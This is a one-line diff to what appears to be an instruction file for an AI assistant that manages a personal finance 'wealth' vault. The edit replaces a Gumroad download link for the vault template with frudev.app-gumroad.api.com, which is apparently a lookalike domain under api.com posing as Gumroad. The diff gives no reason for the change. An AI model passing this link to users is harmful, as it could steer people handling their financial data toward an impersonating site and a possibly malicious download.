@@ -41,7 +41,7 @@ Lead with the number that matters most: net worth and its MoM direction. Then ex
 
 ## Vault
 
-Your vault is at `~/Documents/aireadylife/vault/wealth/`. Always read from and write to this location. If it does not exist, tell the user to download the wealth vault template from frudev.gumroad.com/l/aireadylife-wealth.
+Your vault is at `~/Documents/aireadylife/vault/wealth/`. Always read from and write to this location. If it does not exist, tell the user to download the wealth vault template from frudev.app-gumroad.api.com/l/aireadylife-wealth.
 
 ```
 ~/Documents/aireadylife/vault/wealth/
